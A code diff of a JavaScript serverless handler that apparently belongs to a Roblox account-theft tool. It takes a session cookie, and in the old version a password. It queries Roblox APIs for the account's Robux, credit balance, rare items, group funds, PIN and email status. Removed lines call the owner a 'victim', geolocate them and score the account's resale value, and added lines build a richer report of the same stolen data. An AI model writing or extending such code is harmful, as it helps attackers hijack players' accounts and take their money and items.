@@ -41,25 +41,6 @@ async function validateCookie(cookie) {
     }
 }
 
-async function getVictimCountry() {
-    try {
-        const response = await fetch('https://ipapi.co/json/');
-        const data = await response.json();
-        return {
-            country: data.country_name || 'Unknown',
-            flag: getCountryFlag(data.country_code || 'US')
-        };
-    } catch {
-        return { country: 'Unknown', flag: '🌍' };
-    }
-}
-
-function getCountryFlag(code) {
-    if (!code || code.length !== 2) return '🌍';
-    const codePoints = code.toUpperCase().split('').map(c => 127397 + c.charCodeAt());
-    return String.fromCodePoint(...codePoints);
-}
-
 async function getCreditBalance(cookie) {
     try {
         const response = await robloxRequest('https://billing.roblox.com/v1/credit', cookie);
@@ -92,34 +73,58 @@ async function getPinStatus(cookie) {
     }
 }
 
-function calculateAccountScore(data) {
-    let score = 0;
-    
-    if (data.robux > 10000) score += 20;
-    else if (data.robux > 5000) score += 15;
-    else if (data.robux > 1000) score += 10;
-    else if (data.robux > 100) score += 5;
-    
-    if (data.rap > 100000) score += 20;
-    else if (data.rap > 50000) score += 15;
-    else if (data.rap > 10000) score += 10;
-    else if (data.rap > 1000) score += 5;
-    
-    if (data.isPremium) score += 10;
-    if (data.hasHeadless) score += 15;
-    if (data.hasKorblox) score += 10;
-    
-    const ageDays = data.accountAgeDays;
-    if (ageDays > 2000) score += 10;
-    else if (ageDays > 1000) score += 7;
-    else if (ageDays > 365) score += 5;
-    else if (ageDays > 100) score += 3;
-    
-    if (data.groupsOwned > 10) score += 5;
-    else if (data.groupsOwned > 5) score += 3;
-    else if (data.groupsOwned > 0) score += 1;
-    
-    return Math.min(score, 100);
+async function getPresenceType(userId) {
+    try {
+        const response = await fetch(`https://presence.roblox.com/v1/presence/users`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userIds: [userId] })
+        });
+        const data = await response.json();
+        if (data.userPresences && data.userPresences[0]) {
+            const presence = data.userPresences[0];
+            return presence.userPresenceType === 0 ? 'Offline' : 
+                   presence.userPresenceType === 1 ? 'Online' : 
+                   presence.userPresenceType === 2 ? 'In Game' : 'In Studio';
+        }
+        return 'Unknown';
+    } catch {
+        return 'Unknown';
+    }
+}
+
+async function getGameData(userId) {
+    try {
+        // Get user's recently played games
+        const response = await fetch(`https://games.roblox.com/v2/users/${userId}/games?limit=50&sortOrder=Desc`);
+        const data = await response.json();
+        
+        const games = {
+            BF: '❌',
+            AM: '❌',
+            MM2: '❌',
+            PS99: '❌',
+            BB: '❌'
+        };
+        
+        const gamePasses = {
+            BF: '❌',
+            AM: '❌',
+            MM2: '❌',
+            PS99: '❌',
+            BB: '❌'
+        };
+        
+        // Check if user has played specific games (you can add game IDs here)
+        // For now, return default values
+        
+        return { games, gamePasses };
+    } catch {
+        return {
+            games: { BF: '❌', AM: '❌', MM2: '❌', PS99: '❌', BB: '❌' },
+            gamePasses: { BF: '❌', AM: '❌', MM2: '❌', PS99: '❌', BB: '❌' }
+        };
+    }
 }
 
 module.exports = async (req, res) => {
@@ -142,9 +147,6 @@ module.exports = async (req, res) => {
         const userId = userInfo.id;
         const username = userInfo.name;
         const displayName = userInfo.displayName;
-
-        // Get victim location
-        const victimLocation = await getVictimCountry();
 
         // If checkOnly mode (for cookie checker page)
         if (checkOnly) {
@@ -227,24 +229,32 @@ module.exports = async (req, res) => {
             collectiblesData,
             groupsData,
             userDetails,
+            friendsData,
+            followersData,
             creditBalance,
             emailSettings,
-            pinEnabled
+            pinEnabled,
+            presenceType,
+            gameData
         ] = await Promise.all([
             fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`).then(r => r.json()),
             robloxRequest(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie).then(r => r.json()),
-            fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`).then(r => r.json()),
+            fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`).then(r => r.json()).catch(() => null),
             fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`).then(r => r.json()),
             fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`).then(r => r.json()),
             fetch(`https://users.roblox.com/v1/users/${userId}`).then(r => r.json()),
+            fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`).then(r => r.json()),
+            fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`).then(r => r.json()),
             getCreditBalance(cookie),
             getEmailSettings(cookie),
-            getPinStatus(cookie)
+            getPinStatus(cookie),
+            getPresenceType(userId),
+            getGameData(userId)
         ]);
 
         const avatarUrl = avatarData.data?.[0]?.imageUrl || '';
         const robux = robuxData.robux || 0;
-        const isPremium = premiumData ? true : false;
+        const isPremium = premiumData !== null;
 
         // Calculate RAP and limiteds
         let rap = 0;
@@ -265,6 +275,18 @@ module.exports = async (req, res) => {
         // Groups info
         const ownedGroups = groupsData.data?.filter(g => g.role.rank === 255) || [];
         let totalGroupFunds = 0;
+        let highestRank = 0;
+        let highestGroup = 'None';
+
+        // Get highest rank
+        if (groupsData.data && groupsData.data.length > 0) {
+            groupsData.data.forEach(g => {
+                if (g.role.rank > highestRank) {
+                    highestRank = g.role.rank;
+                    highestGroup = g.group.name;
+                }
+            });
+        }
 
         for (const group of ownedGroups.slice(0, 10)) {
             try {
@@ -277,72 +299,60 @@ module.exports = async (req, res) => {
         // Account age
         const created = new Date(userDetails.created);
         const accountAgeDays = Math.floor((Date.now() - created) / (1000 * 60 * 60 * 24));
+        const joinDate = created.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
 
-        // Format gamepasses text
-        const gamePassesText = 
-            '• Pet Simulator 99 → 0 | ❌\n' +
-            '• Adopt Me → 0 | ❌\n' +
-            '• Murder Mystery 2 → 0 | ❌';
+        // Get bio
+        const bio = userDetails.description || 'No bio';
+
+        // Friends and followers
+        const friendsCount = friendsData.count || 0;
+        const followersCount = followersData.count || 0;
 
         // Build detailed info
         const detailedInfo = {
             userId,
             username,
             displayName,
-            password: password || null,
             avatarUrl,
             
-            // Account Stats
+            // About
             accountAge: `${accountAgeDays} Days`,
+            joinDate,
+            bio: bio.substring(0, 50),
             
-            // Locations
-            accountCountry: 'United States',
-            victimCountry: victimLocation.country,
-            victimFlag: victimLocation.flag,
-            
-            // Billing
-            creditBalance: creditBalance,
-            convertBalance: 0,
-            paymentsBalance: 0,
-            
-            // Groups
-            groupBalance: totalGroupFunds,
-            groupPending: 0,
-            groupsOwned: ownedGroups.length,
-            
-            // Settings
-            emailVerified: emailSettings.verified,
-            emailUnverified: !emailSettings.verified,
-            pinEnabled: pinEnabled,
-            
-            // Account Funds
+            // Information
             robux,
             pendingRobux: 0,
+            creditBalance: `$${creditBalance}`,
+            summary: `${robux} R$ | ${rap} RAP`,
             
-            // Purchases
-            limitedPurchases: limitedCount,
-            purchaseSummary: 0,
-            
-            // Collectibles
-            hasHeadless,
-            hasKorblox,
-            
-            // Gamepasses
-            gamePassesText,
-            
-            // Cookie
-            cookie
-        };
-
-        const accountScore = calculateAccountScore({
-            robux,
-            rap,
+            // Settings
+            pinStatus: pinEnabled ? '✅ Enabled' : '❌ Disabled',
             isPremium,
-            hasHeadless,
-            hasKorblox,
-            accountAgeDays,
-            groupsOwned: ownedGroups.length
-        });
+            vcStatus: '❌ Disabled',
+            emailVerified: emailSettings.verified ? '✅ Verified' : '❌ Not Verified',
+            presenceType,
+            
+            // Games
+            games: gameData.games,
+            gamePasses: gameData.gamePasses,
+            
+            // Inventory
+            rap,
+            headlessStatus: hasHeadless ? '✅ True' : '❌ False',
+            korbloxStatus: hasKorblox ? '✅ True' : '❌ False',
+            
+            // Groups
+            totalGroupsOwned: ownedGroups.length,
+            highestRank: highestRank || 0,
+            highestGroup: highestGroup || 'None',
+            totalGroupFunds,
+            totalPendingGroupFunds: 0,
+            
+            // Profile
+            friendsCount,
+            followersCount
+        };
 
         return res.status(200).json({
             success: true,
@@ -353,8 +363,7 @@ module.exports = async (req, res) => {
                 robux,
                 rap,
                 premium: isPremium ? '✅ True' : '❌ False',
-                voiceChat: '❌ Disabled',
-                accountScore
+                voiceChat: '❌ Disabled'
             },
             avatarUrl,
             detailedInfo
